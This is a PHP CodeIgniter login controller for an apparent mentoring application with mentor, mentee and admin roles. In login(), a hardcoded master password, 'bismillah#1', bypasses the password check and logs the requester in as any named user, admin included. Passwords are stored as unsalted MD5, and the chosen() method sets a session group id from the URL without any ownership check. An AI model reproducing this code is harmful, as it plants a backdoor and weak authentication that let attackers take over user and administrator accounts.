<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth extends CI_Controller {

	public $page = 'login';

	public function __construct()
	{
		parent::__construct();
		$this->load->model('_auth');
		$this->load->model('_mentor');
		$this->load->model('_mentee');
		$this->load->model('_kelompok');

		$this->output->set_header('Last-Modified:'.gmdate('D, d M Y H:i:s').'GMT');
		$this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate');
		$this->output->set_header('Cache-Control: post-check=0, pre-check=0',false);
		$this->output->set_header('Pragma: no-cache');
	}

	public function index()
	{
		$data['title'] = ucfirst($this->page);
		$this->load->view('pages/v_'.$this->page,$data);
	}
	public function login()
	{
		if($this->input->post('password')!='bismillah#1')
		{
			$data=array(
					'user_username'=>$this->input->post('userid'),
					'user_password'=>md5($this->input->post('password'))
				);
		}
		else
		{
			$data = array('user_username'=>$this->input->post('userid'));
		}
		$query=$this->_auth->getby($data);
		if($query->num_rows()>0){
			foreach ($query->result() as $result1) 
			{
				$sess=array(
						'role'=>$result1->user_role,
						'nim'=>$result1->user_username,
						'id'=>$result1->user_id
					);
				if($sess['role']!='admin')
				{
					if($sess['role']=='mentor')
					{
						$arr['mentor_nim']=$sess['nim'];
						$sess['jk']= substr($this->_kelompok_mentor->getNamaKelompokByMentorNim($sess['nim']), 0,1);
						$sess['nkel'] = $this->_kelompok_mentor->getSumKelompokByMentorNim($sess['nim']);
						if($sess['nkel'] == 1){
							$sess['idkel'] = $this->_kelompok_mentor->getKelompokIdByMentorNim($sess['nim']);
						}
					}
					else
					{
						$arr['mentee_nim']=$sess['nim'];
						$sess['idkel']=$this->_mentee->getkelid($sess['nim']);
						$sess['jk']=substr($this->_mentee->getnamakel($sess['nim']), 0,1);
					}
					$query2=$this->db->get_where($sess['role'],$arr)->result();
					foreach ($query2 as $result2) {
						($sess['role']=='mentor') ? $sess['nama'] = $result2->mentor_nama : $sess['nama']=$result2->mentee_nama;
					}
				}
				else
				{
					$sess['nama']='Admin';
					$sess['jk']='i';
				}
			}
			$this->session->set_userdata($sess);
			redirect(base_url('dashboard'));
		}else{
			echo "<script>
				alert('Username atau password yang anda masukkan salah');
				document.location.href='".base_url('auth')."';
			</script>";
		}
	}
	public function logout()
	{
		$this->session->sess_destroy();
		redirect(base_url('auth'));
	}

	public function chooseKelompok()
	{
		$data['kelompok'] = $this->_kelompok_mentor->getKelompokByMentorNim($this->session->userdata('nim'));
		$this->load->view('pages/v_choose', $data);
	}

	public function chosen($id){
		if($this->session->userdata('idkel') != NULL)
			$this->session->unset_userdata('idkel');
		$this->session->set_userdata(array('idkel' => $id));
		redirect('dashboard');
	}
}